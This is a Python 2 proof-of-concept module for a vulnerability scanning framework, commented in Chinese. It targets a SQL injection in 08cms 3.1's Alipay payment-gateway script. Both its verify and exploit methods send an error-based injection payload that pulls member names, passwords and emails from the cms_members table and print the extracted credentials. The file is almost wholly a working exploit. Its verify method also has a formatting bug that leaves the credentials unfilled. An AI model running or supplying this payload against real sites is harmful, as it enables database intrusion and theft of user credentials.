# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = '08CMS_0101' # 平台漏洞编号，留空
    name = '08cms 3.1 /include/paygate/alipay/pays.php SQL注入' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-09-30'  # 漏洞公布时间
    desc = '''
    08cms 3.1 /include/paygate/alipay/pays.php SQL注入漏洞 EXP,
    漏洞出现在/include/paygate/alipay/pays.php文件。
    ''' # 漏洞描述
    ref = 'http://www.cnseay.com/3333/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' # cve编号
    product = '08cms'  # 漏洞应用名称
    product_version = '3.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f950e07d-cb32-4711-be4b-f7eb9234546f' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = ("/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20"+
                       "FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3a,password,"+
                       "0x3a,email,0x3a)%20from%20cms_members%20limit%200,1),FLOOR(RAND(0)*2))X%20"+
                       "FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'")
            verify_url = self.target + payload
            content = urllib2.urlopen(urllib2.Request(verify_url)).read()
            pattern = re.compile(r".*?Duplicate\\s*entry\\s*[']:(?P<username>[^:]+):(?P<password>[^:]+)", re.I|re.S)
            match = pattern.match(content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;username={username}, password={password}'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            payload = ("/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20"+
                       "FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3a,password,"+
                       "0x3a,email,0x3a)%20from%20cms_members%20limit%200,1),FLOOR(RAND(0)*2))X%20"+
                       "FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'")
            verify_url = self.target + payload
            content = urllib2.urlopen(urllib2.Request(verify_url)).read()
            pattern = re.compile(r".*?Duplicate\\s*entry\\s*[']:(?P<username>[^:]+):(?P<password>[^:]+)", re.I|re.S)#\u5ffd\u7565\u5927\u5c0f\u5199\u3001\u5355\u884c\u6a21\u5f0f
            match = pattern.match(content)
            if match:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取到的信息:username={username}, password={password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))
                
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))
            
if __name__ == '__main__':
    Poc().run()